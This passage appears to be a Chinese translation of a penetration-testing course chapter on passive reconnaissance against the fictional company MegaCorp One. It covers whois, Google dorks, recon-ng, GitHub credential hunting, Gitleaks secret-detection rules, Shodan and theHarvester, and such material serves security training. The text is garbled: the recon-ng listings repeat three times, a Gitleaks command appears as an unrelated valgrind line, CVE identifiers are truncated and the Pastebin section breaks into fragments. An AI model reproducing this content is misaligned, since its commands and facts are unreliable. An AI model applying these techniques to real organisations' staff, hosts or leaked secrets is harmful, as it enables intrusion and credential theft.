+信息收集行动会产生大量数据，良好管理数据至关重要，以便我们可以在进一步搜索中利用它们或在后期阶段使用。记录笔记没有对错之分。然而，如果我们保持详细且格式化的笔记，以后检索信息可能会发现这样更容易。
+
+¹³⁸ (Offensive Security, 2019), https://www.megacorp.one/
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. 保留所有权利
+
+135
+
+## 6.2 网站侦察
+
+如果客户有网站，我们可能只有一个网站，而大型组织可能有很多，包括一些未维护的网站。让我们查看 MegaCorp One 的网站（https://www.megacorpone.com/）来了解我们的目标。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_135_0.png)
+
+> 图 19：MegaCorp One
+
+快速查看他们的网站发现，他们是一家纳米技术公司。
+
+https://www.megacorpone.com/about.html 的关于页面显示了他们员工的一些电子邮件地址和 Twitter 账号：
+
+# 关于我们 - Megacorp One - Mozilla Firefox
+
+![](img/f99f528ca9845f4c256ce54e882b1345_136_0.png)
+
+# 认识我们的团队
+
+我们可以在社交媒体收集行动中使用这些地址。我们将在稍后的章节中详细讨论这一点。
+
+值得提到的是，公司的电子邮件地址格式遵循“名字首字母 + 姓氏”的模式。然而，他们 CEO 的电子邮件地址直接使用他的名字。这表明创始人或长期员工的电子邮件格式与新入职员工不同。这些信息在评估的后期阶段可能很有用。
+
+同一页面上的公司社交媒体帐户也值得记录以进行进一步研究：
+
+图 20：关于我们 - Megacorp One
+
+![](img/f99f528ca9845f4c256ce54e882b1345_137_0.png)
+
+图 21：社交媒体 - MegaCorp One
+
+让我们更新笔记，以跟踪包括电子邮件地址和社交媒体引用在内的每条信息。
+
+## 6.3 Whois 枚举
+
+Whois¹13⁹ 是一种 TCP 服务，一种数据库类型，可以提供有关域名的信息，例如名称服务器¹140 和注册商¹141。这些信息通常是公开的，因为注册商不对免费注册收费。
+
+我们可以通过将域名 `megacorp.com` 传递 whois 客户端执行标准正向查询来收集域名的基本信息：
+
+```
+kali@kali:~$ whois megacorp.com
+Domain: MEGACORP.COM
+Registrar Domain ID: 1775445475_DOMAIN_COM-VRSN
+Registrar WHOIS Server: gandi.net
+Registrar URL: http://www.gandi.net
+Updated Date: 2019-01-01T09:45:03Z
+```
+
+
+
+¹³⁹ (Wikipedia, 2019) https://en.wikipedia.org/wiki/Whois
+¹⁴⁰ (Wikipedia, 2019) https://en.wikipedia.org/wiki/Name_server
+¹⁴¹ (Wikipedia, 2019) https://en.wikipedia.org/wiki/Registrar
+¹³⁸ (Offensive Security, 2019), https://www.megacorp.one/
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+我们随后可以使用进一步的运算符来缩小这些结果。例如，`filetype`（或 `ext`）运算符可以将搜索结果限制为指定的文件类型。
+
+在示例中，我们结合多个运算符在 `www.megacorpone.com` (`site:megacorpone.com`) 上定位 PHP 文件 (`filetype:php`)：
+
+图 23：使用文件类型运算符搜索
+
+我们只得到了一个结果，但这是一个有趣的发现。我们的查询找到了 AlienVault OSSIM¹⁴⁵ 的安全信息和事件管理（SIEM）平台的实例登录页面。安全团队使用 SIEM 工具监控应用程序和网络流量以发现恶意活动。通常，这些工具仅在内部网络可用。我们应该记录此 URL，因为如果我们能找到登录凭据以进入活跃利用阶段，它可能会非常之用。
+
+`ext` 运算符也可以帮助识别网站可能使用了哪些编程语言。搜索 `ext:jsp`、`ext:cfm`、`ext:pl` 将分别找到索引的 Java Server Pages、Coldfusion 和 Perl 页面。
+
+我们还可以使用 `-` 修改运算符，以从搜索中排除特定项目，从而缩小搜索范围。
+
+例如，为了寻找非 HTML 页面，我们可以使用 `site:megacorpone.com` 将搜索限制到 megacorpone.com 及其子域名，随后使用 `-filetype:html` 从结果中排除 HTML 页面：
+
+¹⁴⁵ (AT&T, 2019), https://cybersecurity.att.com/products/ossim
+
+图 24：使用排除运算符搜索
+
+在这种情况下，我们发现了几个有趣的页面，包括一个管理控制台。
+
+在另一个示例中，我们可以使用搜索 `intitle:index of` `parent directory` 来找到标题中包含“index of”且页面上包含“parent directory”单词的页面。
+
+`intitle="index" of "parent directory" - Google - Mozilla Firefox`
+
+# Index of /dist/directory
+
+Parent Directory | [DIR] archived/2018-11-06 14:26 - [DIR] api/2018-11-06 14:28 - [DIR] fortress/2018-11-06 14:28 - [DIR] jdbm/2018-11-06 14:28 - ...
+
+# Index of /Documents/Videos/Videos-Movies - Parent Directory
+
+Parent Directory | [DIR] 1- Series & 8Sags/2019-11-10 16:01, [DIR], 2- New Movies/2019-11-00 08:58, [DIR], 3- Documentaries/2019-09-10 01:51, ...
+
+# Index of /download
+
+Parent Directory | [DIR] current/2019-09-26 10:00 - [DIR] development/2019-04-29 12:43 - [DIR] documents/2019-04-18 15:45 - [DIR] more/2019-04-29 12:56, ...
+
+输出指的是目录列表¹⁴⁶ 页面，这些页面列出了目录索引页的内容。配置错误可能会泄露有趣的文件和敏感信息。
+
+这些基础示例仅显示了我们使用搜索运算符所能做的一小部分。Google 黑客数据库 (`GHDB`)¹⁴⁷ 包含了大量的创意搜索，展示了结合运算符进行创造性搜索的力量：
+
+¹⁴⁶ (MITRE, 2019), https://cwe.mitre.org/data/definitions/548.html
+¹⁴⁷ (Offensive Security, 2019), https://www.exploit-db.com/google-hacking-database
+
+## EXPLOIT 数据库
+
+### Google 黑客数据库
+
+| 添加日期 | Dork | 类别 | 作者 |
+| :--- | :--- | :--- | :--- |
+| 2019-09-18 | site:"/auth/authorize" | 包含登录的页面 | Reza Abasi |
+| 2019-09-18 | index of:"admin.db" | 敏感目录 | The Joker |
+| 2019-09-18 | index of:"*filetype:log" | 敏感目录 | The Joker |
+| 2019-09-17 | index of:"backup/web.php" | 包含登录的页面 | Yivan |
+| 2019-09-17 | site:"*reset password" | 包含登录的页面 | Paris Arora |
+| 2019-09-17 | site:filetype index:"manual" | 包含敏感信息的文件 | Deepak Kumar |
+| 2019-09-17 | index of:"backup/mysql" | 敏感目录 | Sanya Chawla |
+| 2019-09-17 | mailto:example.com | 包含登录的页面 | Sravan |
+| 2019-09-16 | site:"search/index.php" | 包含敏感信息的文件 | Mayur Pawar |
+| 2019-09-16 | title:"login" site:welcome | 包含登录的页面 | Reza Abasi |
+| 2019-09-16 | site:"shibboleth/saml/POST" | 包含登录的页面 | Reza Abasi |
+| 2019-09-16 | site:"auth/login.php" | 包含登录的页面 | Reza Abasi |
+
+图 26：Google 黑客数据库 (GHDB)
+
+精通他人的技巧，结合敏锐的推断能力，是有效进行搜索引擎“黑客”的关键技能。
+
+## 6.4 练习
+
+- MegaCorp One 的法务副总裁是谁？他们的电子邮件地址是什么？
+- 使用 Google dorks（GHDB 中的任意一个或多个）在 `www.megacorpone.com` 上搜索有趣的文档。
+- 除了 `www.megacorpone.com` 上列出的，你还能识别出哪些 MegaCorp 员工？
+
+## 6.5 Netcraft
+
+Netcraft 是一家位于英国的互联网服务公司，提供一个免费的网络门户来执行各种信息收集。使用像 Netcraft 这样的服务被认为是一种被动技术，因为我们从不与目标交互。
+
+让我们回顾如何使用 Netcraft 的 DNS 搜索页面 (`https://searchdns.netcraft.com`) 来收集关于 `megacorpone.com` 域的信息：
+
+¹⁴⁸ (Netcraft, 2019), https://www.netcraft.com/
+
+### 按域名搜索 Web
+
+Netcraft 访问过的 Web 站点 2019年9月20日
+
+### *.megacorpone.com 的结果
+
+找到 5 个站点
+
+| 站点 | 站点报告 | 首次出现 | 网块 | 操作系统 |
+| :--- | :--- | :--- | :--- | :--- |
+| 1. www.megacorpone.com | | 2013 | point, inc. | linux |
+| 2. intranet.megacorpone.com | | | point, inc. | unknown |
+| 3. admin.megacorpone.com | | | point, inc. | unknown |
+| 4. support.megacorpone.com | | | volico | unknown |
+| 5. vpn.megacorpone.com | | 2016 | point, inc. | linux |
+
+图 27：Netcraft 结果
+
+对于每个服务器，我们可以通过点击 URL 旁的文件图标来查看“站点报告”，以获取有关该服务器的信息。
+
+## www.megacorpone.com 的站点报告
+
+### NetScan 扩展
+
+- 背景
+- 立即下载！
+- 报告钓鱼
+- 站点报告
+- 顶级报告者
+- 报告者的奖励
+- 被钓鱼的 TLD
+- 被钓鱼的国家
+- 被钓鱼的托管
+- 被钓鱼的证书机构
+- 钓鱼地图
+- 取消地图
+- 最热门网站
+- 品牌扩展
+- 告诉朋友
+
+### 钓鱼与欺诈
+
+- 钓鱼站点推送
+- 托管钓鱼警报
+- SSL 钓鱼警报
+- 针对 TLD 的反钓鱼
+- 钓鱼与恶意软件
+- 设备声誉
+- 银行欺诈检测
+- 钓鱼站点应对措施
+
+图 28：Netcraft 站点报告
+
+报告的开头涵盖了注册信息。但是，如果我们向下滚动，就会发现各种“站点技术”条目：
+
+这些技术列表在我们转向主动信息收集和利用时非常有用。现在，我们将其加入笔记。
+
+### 6.5.1.1 练习
+
+- 使用 Netcraft 确定 `www.megacorp.com` 上运行什么应用程序服务器。
+
+## 6.6 Recon-ng
+
+`recon-ng`¹⁴⁹ 是一个基于模块的 Web 信息收集框架。`Recon-ng` 将模块的结果显示在终端中，但也将将其存储在数据库中。`Recon-ng` 的很大力量源于将一个模块的结果输入另一个模块，允许我们快速扩大信息收集的范围。
+
+让我们使用 `recon-ng` 收集 MegaCorp One 的有趣数据。为了开始，我们只需运行 `recon-ng`
+
+# 攻击性安全
+www.offensive-decoding.com
+
+基于 Kali Linux 2.0 的渗透测试
+
+```
+kali@kali:- recon-ng
+```
+`+]` 节点检查已禁用。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_148_0.png)
+
+赞助商...
+
+```
+[recon-ng v5.0.0, Tim Tomes (@lanmaster53)]
+```
+`[+]` 无已启用/安装的模块。
+
+```
+[recon-ng][default] >
+```
+
+列表 196 - 启动各种模块以使用 recon-ng。
+
+根据输出结果，我们需要安装各种模块才能使用 recon-ng。
+
+我们可以从 recon-ng 的“市场”(`Marketplace`)中添加模块。我们将从主提示符通过 `marketplace search` 并提供搜索字符串作为参数来搜索市场。
+
+在这个示例中，我们搜索包含 github 术语的模块。
+
+
+
+[recon-ng][default] > `marketplace search github`
+
+[*] 正在搜索索引 'github'...
+
+```
+| | 路径 | | 状态 | D | K |
+|---|---|---|---|---|---|
+| | recon/companies-github/miner | | 1.0 | 未安装 | * |
+| | recon/profiles-github/users | | 1.0 | 未安装 | * |
+| | recon/profiles-profiler | | 1.0 | 未安装 | |
+| | recon/repositories-github/repos | | 1.0 | 未安装 | * |
+| | recon/repositories-github/commits | | 1.0 | 未安装 | * |
+| | recon/vulnerabilities/github_dorks | | 1.0 | 未安装 | * |
+```
+
+D = 有依赖项。详见详情。
+K = 需要密钥。详情见详情。
+
+列表 197 - 在市场中搜索 GitHub 模块
+
+注意某些模块在“K”列中被标记了星号。这些模块需要第三方提供者的凭据或 API 密钥。`recon-wiki` 维护了一份模块所使用的密钥短列表。其中一些密钥免费账户可用，而另一些则需要订阅。
+
+150 (Tim Tomes, 2019), https://github.com/lanmaster53/recon-ng/wiki/Features#module-marketplace
+151 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Application_programming_interface_key
+152 (Tim Tomes, 2019), https://github.com/lanmaster53/recon-ng/marketplace/wiki/API-Keys
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利 149
+
+# 基于 Kali Linux 2.0 的渗透测试
+
+我们可以通过使用 `marketplace info` 后接模块名称来获取更多模块信息。由于 GitHub 模块需要 API 密钥，让我们使用此命令来检查 `recon/domains-hosts/google_site_web` 模块：
+
+```
+[recon-ng][default] > marketplace info recon/domains-hosts/google_site_web
+```
+
+| 路径 | recon/domains-hosts/google_site_web |
+| 名称 | Google 主机枚举器 |
+| 作者 | Tim Tomes (@lanmaster53) |
+| 版本 | 1.0 |
+| 最后更新 | 2019-06-24 |
+|  | 使用 'site' 算符从 Google.com 收集主机。 |
+| 需要密钥 | [] |
+| 依赖项 | [] |
+| 文件 | [] |
+| 状态 | 未安装 |
+
+```
+[recon-ng][default] >
+```
+
+列表 199 - 获取模块信息
+
+根据该描述，此模块使用 'site' 算符搜索 Google，且不需要 API 密钥。让我们用 `marketplace install` 安装该模块：
+
+```
+[recon-ng][default] > marketplace install recon/domains-hosts/google_site_web
+[*] 模块已安装: recon/domains-hosts/google_site_web
+[*] 正在重新加载模块...
+[recon-ng][default] >
+```
+
+列表 199 - 安装模块
+
+安装模块后，我们可以使用 `module load` 后接其名称来加载它。然后，我们将使用 `info` 显示模块的详细信息和所需的参数：
+
+```
+[recon-ng][default] > modules load recon/domains-hosts/google_site_web
+[recon-ng][default][google_site_web] > info
+```
+
+```
+Name: Google Hostname Enumerator
+
+Author: Tim Tomes (@lanmaster53)
+
+Version: 1.0
+```
+
+Description
+使用 'site' 搜索算符从 Google.com 收集主机。用结果更新 'hosts' 表。
+
+Options:
+Name 当前值 必须 描述
+SOURCE default 输入源（详情请见 'show info'）
+
+![](img/f99f528ca9845f4c256ce54e882b1345_150_0.png)
+
+源 选项:
+default
+<string> 代表单个输入的字符串
+<path> 包含输入列表的文件路径
+query <sql> 返回其中一列结果的数据库查询
+
+```
+[recon-ng][default] [google_site_web] >
+```
+
+列表 200 - 使用 recon/domains-hosts/google_site_web
+
+注意输出中包含了关于我们已安装并加载的模块的额外信息。根据输出，该模块需要一个源（source），即我们想要收集信息的 target。在这种情况下，我们使用 `options set megacorp.com` 来设置目标域名：
+
+```
+[recon-ng][default] [google_site_web] > options set megacorp.com
+SOURCE => megacorp.com
+```
+
+列表 201 - 设置源
+
+最后，我们运行该模块：
+
+```
+[recon-ng][default] [google_site_web] > run
+```
+
+```
+MEGACORP.COM
+
+----------------------
+
+----------------------
+
+[*] 正在搜索: site:megacorp.com
+[*] host www.megacorp.com <blank>
+[*] host vpn.megacorp.com <blank>
+[*] host www2.megacorp.com <blank>
+[*] host stiem.megacorp.com <blank>
+[*] 正在搜索: site:megacorp.com -site:vpn.megacorp.com -site:www2.megacorp.com -site:stiem.megacorp.com
+SUMMARY
+
+----------------------
++] 找到共 4 个（4 个新的）主机。
+```
+
+列表 202 - 运行模块
+
+我们从 DNS 搜索中找到的结果并没有浪费。根据输出，该模块需要一个源，即我们要收集信息的 target。在这种情况下，我们使用 `options set megacorp.com` 来设置目标域名：
+
+```
+[recon-ng][default] [google_site_web] > options set megacorp.com
+SOURCE => megacorp.com
+```
+
+列表 201 - 设置源
+
+最后，我们运行该模块：
+
+```
+[recon-ng][default] [google_site_web] > run
+```
+
+```
+MEGACORP.COM
+
+----------------------
+
+----------------------
+
+[*] 正在搜索: site:megacorp.com
+[*] host www.megacorp.com <blank>
+[*] host vpn.megacorp.com <blank>
+[*] host www2.megacorp.com <blank>
+[*] host stiem.megacorp.com <blank>
+[*] 正在搜索: site:megacorp.com -site:vpn.megacorp.com -site:www2.megacorp.com -site:stiem.megacorp.com
+SUMMARY
+
+----------------------
++] 找到共 4 个（4 个新的）主机。
+```
+
+列表 202 - 运行模块
+
+我们从 DNS 搜索中找到的结果并没有浪费。根据输出，该模块需要一个源，即我们要收集信息的 target。在这种情况下，我们使用 `options set megacorp.com` 来设置目标域名：
+
+```
+[recon-ng][default] [google_site_web] > options set megacorp.com
+SOURCE => megacorp.com
+```
+
+
+
+### 列表 201 - 设置源
+
+最后，我们运行该模块：
+
+```
+[recon-ng][default] [google_site_web] > run
+```
+
+```
+MEGACORP.COM
+----------------------
+----------------------
+[*] 正在搜索: site:megacorp.com
+[*] host www.megacorp.com <blank>
+[*] host vpn.megacorp.com <blank>
+[*] host www2.megacorp.com <blank>
+[*] host stiem.megacorp.com <blank>
+[*] 正在搜索: site:megacorp.com -site:vpn.megacorp.com -site:www2.megacorp.com -site:stiem.megacorp.com
+
+SUMMARY
+----------------------
++] 找到共 4 个（4 个新的）主机。
+```
+
+### 列表 202 - 运行模块
+
+我们从 DNS 搜索中找到的结果并没有浪费。根据输出，该模块需要一个源，即我们要收集信息的 `target`。在这种情况下，我们使用 `options set megacorp.com` 来设置目标域名：
+
+```
+[recon-ng][default] [google_site_web] > options set megacorp.com
+SOURCE => megacorp.com
+```
+
+最后，我们运行该模块：
+
+```
+[recon-ng][default] [google_site_web] > run
+```
+
+```
+MEGACORP.COM
+----------------------
+----------------------
+[*] 正在搜索: site:megacorp.com
+[*] host www.megacorp.com <blank>
+[*] host vpn.megacorp.com <blank>
+[*] host www2.megacorp.com <blank>
+[*] host stiem.megacorp.com <blank>
+[*] 正在搜索: site:megacorp.com -site:vpn.megacorp.com -site:www2.megacorp.com -site:stiem.megacorp.com
+
+SUMMARY
+----------------------
++] 找到共 4 个（4 个新的）主机。
+```
+
+# 攻击性安全
+
+如果我们显示主机，就可以验证数据库已根据两个模块的结果更新了信息：
+
+```
+[recon-ng][default] > show hosts
+```
+
+|  | host | ip_address | region | country | module |
+|---|---|---|---|---|---|
+| 1 | www.megacorp.com | 38.100.193.76 |  |  | google_site_web |
+| 2 | vpn.megacorp.com | 38.100.193.77 |  |  | google_site_web |
+| 3 | www2.megacorp.com | 38.100.193.79 |  |  | google_site_web |
+| 4 | siem.megacorp.com | 38.100.193.89 |  |  | google_site_web |
+
+* 返回了 4 行
+
+### 列表 208 - 多个模块后显示主机
+
+## 6.6.1.1 练习题（本练习不需要报告）
+
+- 1. 使用 `recon/domains-hosts/google_site_web` 和 `recon/hosts-hosts/resolve` 模块收集 MegaCorp One 的信息。
+- 2. 花些时间探索其他 `recon-ng` 模块。
+
+## 6.7 开源代码
+
+在接下来的章节中，我们将讨论用于被动搜索信息的各种来源。一些开源项目和代码库，例如 GitHub¹153 GitLab¹154 和 SourceForge¹155。
+
+存储在线的代码可以让我们一览组织使用的编程语言和框架。在某些情况下，开发者甚至无意中将敏感数据和凭据提交到了公共平台。
+
+这些平台的搜索工具将支持我们在在本模块之前讨论过的 Google 搜索运算符。
+
+
+
+例如，GitHub 的搜索¹156 非常灵活。在 GitHub 上，我们能够搜索用户或组织的仓库，但如果我们想搜索所有公共仓库，则需要一个账户。
+
+在之前的一个模块中，我们识别了 MegaCorp One 的 GitHub 账户。
+
+让我们搜索该账户仓库中的有趣信息。我们可以使用 `filename:users` 来搜索任何名称中包含“users”单词的文件：
+
+¹153 (GitHub, 2019), https://github.com/
+
+¹154 (GitLab, 2019), https://about.gitlab.com/
+
+¹155 (Slashdot Media, 2019), https://sourceforge.net/
+
+¹156 (GitHub, 2019), https://help.github.com/en/searching-for-information-on-github/searching-code
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 154
+
+## MegaCorp One
+
+megacorpone
+
+MegaCorp One 作为世界上最先进的纳米技术公司而闻名。
+
+- MegaCorp One
+- 2 Old Mill St Rachel, NV 89001
+
+我们的搜索只找到了一个文件 - `xampp.users`。即使只有一个结果，我们也可能发现了非常有趣的东西，因为 XAMPP¹57 是一个 Web 开发环境。让我们检查该文件的内容。
+
+> 157 (Apache Friends, 2019), https://www.apachefriends.org/index.html
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 155
+
+图 31: GitHub 搜索结果
+
+该文件似乎包含一个用户名和密码哈希¹⁵⁸，这在我们开始主动攻击阶段时可能非常有用。将其加入我们的笔记。
+
+¹⁵⁸ (Wikipedia, 2019) https://en.wikipedia.org/wiki/Cryptographic_hash_function#Password_verification
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+megacorp.com/xampmp/users at a0ad2670c1cbe925884736c0ecad460b2fdd96 - megacorp/megacorp.com - GitHub - Mozilla Fi
+
+这种手动方法在小型仓库上效果最好。对于较大的仓库，我们可以使用几个工具来帮助自动化搜索，例如 `Gitrorb`¹⁵⁹ 和 `Gitleaks`¹⁶⁰。`Recon-go` 也有几个搜索 GitHub 的模块。这些工具大部分需要一个访问令牌¹⁶¹ 来使用代码托管提供者的 API。
+
+例如，下面的截图显示了 `Gitleaks` 在文件中发现 AWS ID¹⁶²：
+
+159 (Michael Henriksen, 2018), https://github.com/michenksen/gitrorb
+
+160 (Zachary Rice, 2019), https://github.com/zricethez/gitleaks
+
+161 (GitHub, 2019), https://github.com/en/articles/creating-a-personal-access-token-the
+
+162 (Amazon Web Services, 2019), https://docs.aws.com/latest/guide/types.html#access-keys-and-secret
+
+PWK 2.0 © Offensive Security Ltd. All rights reserved. 157
+
+```
+$ valgrind --tool=massif-linux-amd64 -v --rt=https://github.com/ [INFO] 2019-10-27T13:56:08Z cloning https://github.com/
+Enumerating objects: 0
+Counting objects: 0 (100% done)
+Compressing objects: 100% (0/6), done.
+Total 30 (delta 0), reused 0 (delta 0), pack-received 22
+{
+  "line": "Access key",
+  "commit": "A",
+  "offender": "A",
+  "rule": "AWS Client ID",
+  "info": "AKIA|AGPA|IDA|ANVA|ASIA|[0-9][A-Z]* regex match",
+  "commitMsg": "Merge pull request #1 from Update",
+  "author": "A",
+  "email": "A",
+  "file": "aws",
+  "repo": "",
+  "date": "2018-12-12T05:32:08Z",
+  "tags": "key,aws",
+  "severity": ""
+}
+```
+
+搜索源代码中密钥工具（如 GitLab 或 Gitleaks）通常依赖正则表达式¹⁶³或熵⁶⁴来识别潜在有用信息。正则表达式是预定义的搜索模式，特别适用于搜索正文中的密码变体。而基于熵的检测尝试寻找随机生成的字符串。无论工具如何搜索，没有任何工具都会漏掉手动检查可能会发现的内容。
+
+### 6.7.1.1 练习题
+
+- 1. 搜索 Megacorp 的仓库以寻找有趣或敏感信息。
+
+## 6.8 Shodan
+
+在收集目标信息时，重要的是记住传统网站只是互联网的一部分。Shodan¹⁵⁵是一个爬取连接到互联网但不限于万维世界的搜索引擎。它包括运行网站的服务器，还包括路由器和 IoT¹⁶ 设备。
+
+¹⁶³ (Wikipedia, 2019) https://en.wikipedia.org/wiki/Regular_expression
+
+⁶⁴ (Wikipedia, 2019) https://en.wikipedia.org/wiki/Password_strength#Random_passwords
+
+¹⁶⁵ (Shodan, 2019) https://www.shodan.io/
+
+¹⁶⁶ (Wikipedia, 2019) https://en.wikipedia.org/wiki/Internet_of_things
+
+PWK 2.0 © Offensive Security Ltd. All rights reserved. 158
+
+换句话，Google 和其他搜索引擎寻找 Web 服务器内容，而 Shodan 搜索联网设备、与之交互并显示关于它们的信息。
+
+虽然完成本模块或实验中的任何材料都需要 Shodan，但它很有价值。在使用 Shodan 之前，你必须注册一个提供有限访问的免费账户。
+
+让我们搜索 `hostname:megacorpone.com`。在这种情况下，Shodan 列出了 IP、服务和横幅信息。所有这些都是在不与客户端网站交互的情况下被动收集的。
+
+这些信息为我们的提供了互联网足迹快照。例如，有八台服务器运行 SSH，我们可以点击“顶级服务”下的 SSH 来深入分析并精炼结果。
+
+| SHODAN | hostname.megacacorp.com:port:"22" | | Explore | Downloads | Reports | Pricing | Enterprise Access |
+
+|---|---|---|---|---|---|---|---|
+
+| | Exploits | Maps | Share Search | Download Results | Create Report | | My Account | Upgrade |
+
+**新服务：跟踪连接到互联网的内容。查看 Shodan Monitor。**
+
+总结果
+
+8
+
+热门国家
+
+美国 8
+
+38.100.193.84
+
+VOLICO
+
+添加于：2016-11-19T18:59:12Z
+
+美国, 迈亚密里
+
+```
+SSH-2.OpenSSH_6.6p1 - Ubuntu-debuntul.2
+Key type: ssh-rsa
+Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQDC7SBAAAAgEAAABm/f6Xn/f6Xn/f6/SSSSSSS3XXYYYYYYYY/fVv8g
+AvremeH/kjYn/f6Xn/f6X////Y/Y2X22222177777nnnnnnn/f6Yn/f6Xn/6600000655566666ZgMfP75
+...
+```
+
+图 35: 运行 OpenSSH 的 MegaCorp One 服务器
+
+根据 Shodan 的结果，我们确切每台服务器上运行的是什么版本的 OpenSSH。点击 IP 地址，我们可以获取主机的摘要。
+
+
+
+PWK 2.0 © Offensive Security Ltd. All rights reserved. 160
+
+# 攻击性安全
+
+www.offensive-security.com
+
+使用 Kali Linux 进行渗透测试 2.0
+
+38.100.193.84 mail.megacorpone.com 查看原始数据
+
+| 城市 | 迈阿密 |
+|---|---|
+| 国家 | 美国 |
+| 组织 | VOLICO Cogent Communications |
+| ISP |  |
+| 最后更新 | 2019-09-27:15:36:05230 |
+| 主机名 | mail.megacorp.com |
+| ASN | AS533724 |
+
+## 端口
+
+- 22 80 123
+
+## 服务
+
+- 22
+
+OpenSSH_8.2p1 Debian-ubuntu3.2
+
+密钥交换: diffie-hellman-group-exchange-sha256
+
+method: publickey (ssh AAAAAA3NzaC1yc2EAAAADAQABAAACAQQAAAAAggQC7S...AAABGAAA...)
+
+## Web 技术
+
+- 置信度: 50
+- Microsoft ASPNET
+- 出站 Web
+
+## 漏洞
+
+注意：该设备可能受到所有这些问题的影响。漏洞是根据软件暗示的。
+
+CVE-1089 Microsoft Internet Information Services (IIS) 3.5, 6.1, 7.0 和 7.5 的 ASP 实现中的堆栈卷积漏洞，允许远程攻击者通过构造的请求执行任意代码，如 asp.db 中所述，也称为“请求参数请求拒绝服务漏洞”。
+
+CVE-20730 Microsoft Internet Information Services (IIS) 7.5 在启用 FastC 时的缓冲区溢出漏洞，允许远程攻击者通过构造的请求执行任意代码，称为“请求头缓冲区溢出漏洞”。
+
+```
+密钥交换算法:
+ecdh-sha2-nistp256
+ecdh-sha2-nistp384
+diffie-hellman-group-exchange-sha256
+diffie-hellman-group14-sha1
+diffie-hellman-group1-sha
+```
+
+```
+服务器密钥算法:
+ssh-rsa
+ssh-ed25519
+ecdsa-sha2-nistp256
+```
+
+> 图 36：Shodan 主机摘要
+
+我们可以在此页面查看服务器上使用的端口、服务和技术。Shodan 还会显示识别出的任何服务或技术是否存在已公布的漏洞。当我们想要进行主动测试并决定从哪里开始时这些信息是无价的。
+
+## 6.9 安全响应头扫描器
+
+我们还可以使用其他网站来收集有关网站或域名托管安全性的信息。其中一些网站在主动信息收集方面非常透明，对于我们的目的而言，关键在于第三方是否发起了任何扫描或检查。
+
+其中一种 Security Headers，¹⁶⁷ 将分析 HTTP 响应头并对目标网站的安全态提供基本分析。我们可以根据结果对组织和安全实践有一个大致的了解。
+
+让我们扫描 www.megacorp.com 并检查这些
+
+> ¹⁶⁷ (Scott Holm, 2019), /securityheaders.com/
+
+# 立即扫描您的网站
+
+# 安全报告摘要
+
+| 站点: | http://www.megacorppone.com/ - (通过 https 再次扫描) |
+| IP 地址: | 38.100.193.76 |
+| 报告时间: | 2019年9月23日 15:34:55 UTC |
+| 头部: | Content-Security-Policy X-Frame-Options X-Content-Type-Options Refer-Policy Feature-Policy |
+| 警告: | 等级限制为 A，请见下文。 |
+
+图 37：www.megacporpone.com 的扫描结果
+
+该站点缺少几个防御性头部，如 Content-Security-Policy¹¹⁶⁸ 和 X-Frame-Options¹¹⁶⁹。这些头部本身并不是漏洞，但它们可能表明 Web 开发人员或服务器管理员不熟悉服务器加固¹¹⁷⁰
+
+服务器加固或安全配置是通过配置保护服务器的整体过程。这包括禁用未使用的服务、移除未使用的用户或用户帐户；更换密码、设置适当的服务器头部等。不需要了解配置每种服务器的每一个细节，但需要理解这些概念以及在分析服务器时寻找什么，以确定如何最好地接近目标。
+
+## 6.10 SSL 服务器测试
+
+我们可以使用的另一个扫描工具是 Qualys SSL Labs 的 SSL Server Test¹¹⁷¹。该工具分析您的服务器的 SSL/TLS 配置并与当前的最佳实践进行比较。它还会识别一些与 SSL/TLS相关的漏洞，例如 Poodle¹¹⁷² 或 Heartbleed¹¹⁷³。让我们扫描 www.megacorpome.com 并检查结果：
+
+# SSL 报告: megacorpome.com (38.100,193.76)
+
+评估时间：2019年9月23日周一 14:05:00 UTC | 隐藏 | 清除缓存
+
+图 38：megacorpome.com 的 SSL 测试结果
+
+结果没有 Security Headers 那么糟糕。然而，由于弱的 Diffie-Hellman 密钥交换、RC4 密码以及缺乏前向安全性，我们的目标没有应用当前的 SSL/TLS 加固实践。例如，多年来一直建议禁用 RC4 密码¹¹⁷⁴，以应对多种漏洞。我们可以利用这些发现对目标组织内部进行洞察。
+
+## 6.11 Pastebin
+
+Pastebin¹⁷⁵ 是用于存储和共享文本的网站。由于 Pastebin 是随处可见的，我们可以利用它来获取关于 megacorp.com 的信息。由于其某些信息是公开的，我们可以使用它来获取我们的。
+
+> ¹⁷² (2019) https://en.wikipedia.org/POODLE
+
+> ¹⁷³ (2019) https://en.wikipedia.org/Heartbleed
+
+> ¹⁷⁴ (2019) https://en.wikipedia.org/security-advisory
+
+> ¹⁷⁵ (2019) https://en.wikipedia.org/Credential_stuffing
+
+图 39：搜索 Pastebin
+
+我们有几个结果，但其中一些是常见的。由于 Pastebin 是随处可见的，我们可以使用它来。
+
+> ¹⁷⁶ (2019) https://en.wikipedia.org/wiki/security
+
+> 2013-disabledisable
+
+> ¹⁷⁷ (2019) https://en.wikipedia.org/wiki/Pastebin
+
+我们的目标是几个 Pastebin 结果。
+
+## 6.12 信息收集
+
+除了收集信息外，我们还可以通过这种方式获取关于用户的详细信息。在这种情况下，我们将使用 Harvester，¹⁷⁷ 获取名称、子域名、IP 和 URL。例如，我们可以
+
+> ¹⁷⁸ (2019) https://github.com/laramies/theHarvester
+
+```
+kali@kali~$ theharvester -d megacorp.com -b google
+```
+
+```
+[-] 正在为域名 megacorp.com 开始收集过程
+
+[-] 在 Google 中搜索：
+正在 0 个结果...
+正在 100 个结果...
+正在 200 个结果...
+正在 300 个结果...
+正在 400 个结果...
+```
+
+收集结果
+
+未找到 IP 地址
+
+```
+[+] 找到电子邮件：
+----------------
+joe@megacorp.com
+mcarlow@megacorp.com
+```
+
+```
+[+] 在搜索引擎中找到主机：
+--------------------------------
+```
+
+总主机数：13
+
+```
+[-] 解析主机名 IP...
+1.megacorp.com:38.100.193.70
+Siem.megacorp.com:38.100.193.89
+admin.megacorp.com:38.100.193.83
+beta.megacorp.com:38.100.193.82
+fs1.megacorp.com:38.100.193.82
+intranet.megacorp.com:38.100.193.87
+mail.megacorp.com:38.100.193.84
+mail2.megacorp.com:38.100.193.73
